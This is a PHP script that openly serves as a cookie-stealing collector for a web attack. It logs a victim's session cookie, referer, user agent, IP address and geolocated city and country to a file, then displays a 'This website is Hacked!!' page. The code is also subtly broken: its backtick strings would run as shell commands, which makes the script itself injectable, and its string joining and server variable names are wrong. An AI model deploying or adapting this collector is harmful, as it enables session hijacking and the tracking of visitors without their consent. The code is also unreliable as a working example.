<?php

$cookie = $_GET['cookie'];
$ref = $_SERVER['HTTP_REFERER'];
$uAgent = $_SERVER['HTTP_USER_AGENT'];
$sName = $_SERVER['HTTP_SERVER_NAME'];
$sIP = $_SERVER['HTTP_ADDR'];


function getIPAddress()
{
  //whether ip is from the share internet  
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  }
  //whether ip is from the proxy  
  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  }
  //whether ip is from the remote address  
  else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}

$publicIP = getIPAddress();
$json = file_get_contents("http://info.io/$publicIP/geo");
$json = json_decode($json, true);
// location
$country = $json['country'];
$region = $json['region'];
$city = $json['city'];
$all = `victim cookie : $cookie` + `\n\n Refrerer :  $ref` + `user agent : $uAgent` +  `server name : $sName` +  `server ip : $sIP` + `\n\n publicIP : $publicIP` + `\n\n Country : $country` + `\n\n region : $region` + `\n\n city : $city`;


$handle = fopen('Log.txt', 'a');
fwrite($handle, $all);
fclose($handle);
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>HACKED!!!</title>
</head>

<body>
  <h1 style="color: red; font-size: 50px; text-align: center;">This website is Hacked!!</h1>
</body>

</html>